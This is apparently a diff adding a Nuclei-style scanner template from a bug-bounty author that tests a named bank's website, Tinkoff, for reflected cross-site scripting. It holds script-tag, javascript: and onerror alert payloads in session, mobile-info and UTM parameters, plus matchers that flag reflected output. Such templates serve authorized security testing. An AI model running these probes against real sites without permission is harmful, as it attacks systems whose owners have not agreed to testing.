@@ -1,0 +1,36 @@
+id: tinkoff-xss
+
+info:
+  name: Tinkoff - Cross-Site Scripting (XSS)
+  author: bugbounty
+  severity: high
+  description: XSS in session_info, utm parameters, and API endpoints
+  tags: xss,tinkoff
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/common/v1/session_info?platform=<script>alert(1)</script>&sessionid=test"
+      - "{{BaseURL}}/api/common/v1/mobile_info?platform=\"><script>alert(1)</script>&sessionid=test"
+      - "{{BaseURL}}/cards/debit-cards/tinkoff-black/?utm_source=javascript:alert(1)"
+      - "{{BaseURL}}/invest/stocks?utm_medium=<img src=x onerror=alert(1)>"
+      - "{{BaseURL}}/api/common/v1/session_info?sessionid='><script>alert(document.domain)</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert"
+          - "javascript:alert"
+          - "onerror=alert"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
